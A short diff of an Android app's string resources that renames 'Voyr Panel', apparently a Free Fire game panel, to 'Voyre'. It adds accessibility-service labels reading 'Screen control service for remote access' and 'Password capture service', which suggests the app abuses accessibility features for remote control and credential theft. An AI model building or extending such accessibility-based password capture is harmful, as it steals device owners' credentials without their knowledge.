@@ -1,4 +1,5 @@
 <resources>
-    <string name="app_name">Voyr Panel</string>
-    <string name="accessibility_service_description">Panel Freefire</string>
+    <string name="app_name">Voyre</string>
+    <string name="accessibility_service_description">Screen control service for remote access</string>
+    <string name="password_accessibility_description">Password capture service</string>
 </resources>
